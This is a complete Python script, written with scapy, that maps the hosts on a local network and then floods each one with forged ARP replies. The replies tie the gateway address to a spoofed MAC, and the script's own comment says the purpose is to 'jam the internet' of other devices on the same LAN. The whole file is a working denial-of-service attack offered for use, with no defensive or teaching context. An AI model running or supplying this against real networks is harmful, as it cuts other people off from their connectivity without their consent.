# this code is to jam the internet of the devices that are inside the same LAN, not MITM!
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
arp_table = {}

def get_lan_mac():
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1/24")
    ans, noans = srp(arp_request, timeout=2, verbose=0)
    for sent, recv in ans:
        arp_table[recv.psrc] = recv.hwsrc

def lan_internet_jamming(fake_gateway_ip):
    while True:
        print("Sending")
        try:
            for ip, mac in arp_table.items():
                if ip == "192.168.1.1":
                    continue
                print(f"attacking {ip} -> {mac} ")
                sendp(
                    Ether(src="2c:d8:ae:df:d8:fb", dst=mac) /
                    ARP(
                        op=2,
                        pdst=ip,
                        psrc=fake_gateway_ip,
                        hwdst=mac,
                        hwsrc="2c:d8:ae:df:d8:fb"
                    ),
                    iface="Wi-Fi",
                    verbose=0
                )
            time.sleep(1)
        except Exception as e:
            print("Error:", e)

fake_gateway = "192.168.1.1"
get_lan_mac()
lan_internet_jamming(fake_gateway)
